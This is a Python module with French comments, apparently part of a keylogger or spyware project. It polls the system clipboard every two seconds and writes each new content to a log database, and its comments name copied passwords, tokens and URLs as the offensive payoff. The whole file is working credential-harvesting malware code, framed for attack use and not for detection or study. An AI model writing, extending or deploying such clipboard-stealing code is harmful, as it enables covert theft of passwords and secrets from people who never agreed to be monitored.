# ============================================================
#  core/clipboard.py — Surveillance du presse-papier
#  Rôle : détecter quand le contenu du clipboard change
#         et le logger (mots de passe copiés, URLs, textes...)
#  Dépendances : pip install pyperclip
# ============================================================

# ── CONCEPT : LE PRESSE-PAPIER ───────────────────────────────
# Le presse-papier (clipboard) est une zone mémoire temporaire
# gérée par l'OS. Quand tu fais Ctrl+C, le texte sélectionné
# y est copié. Ctrl+V le colle.
#
# En offensive, le clipboard est très intéressant car les gens
# y copient souvent des mots de passe, des tokens, des URLs...
#
# Notre stratégie : vérifier le contenu toutes les X secondes
# et logger dès qu'il change.

import time
import threading
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
from storage.logger import log_key


CHECK_INTERVAL = 2   # Vérification toutes les 2 secondes


def get_clipboard():
    """
    Lit le contenu actuel du presse-papier.
    Retourne une chaîne vide si le clipboard est vide ou inaccessible.
    """
    try:
        import pyperclip
        return pyperclip.paste() or ""
    except ImportError:
        print("[Clipboard] pip install pyperclip")
        return ""
    except Exception:
        return ""


class ClipboardMonitor:
    """
    Surveille le clipboard en boucle.
    À chaque changement de contenu, on log dans la DB.
    """
    def __init__(self):
        self.running      = False
        self.last_content = ""   # Dernier contenu connu — pour détecter les changements

    def start(self):
        self.running      = True
        self.last_content = get_clipboard()   # Initialisation
        print("[Clipboard] Surveillance démarrée")

        while self.running:
            current = get_clipboard()

            # On log uniquement si le contenu a changé ET n'est pas vide
            if current and current != self.last_content:
                print(f"[Clipboard] Nouveau contenu détecté ({len(current)} chars)")
                # On préfixe avec [CLIPBOARD] pour identifier dans les logs
                log_key(f"[CLIPBOARD: {current[:200]}]", window="clipboard")
                self.last_content = current

            time.sleep(CHECK_INTERVAL)

    def stop(self):
        self.running = False


if __name__ == "__main__":
    cm = ClipboardMonitor()
    cm.start()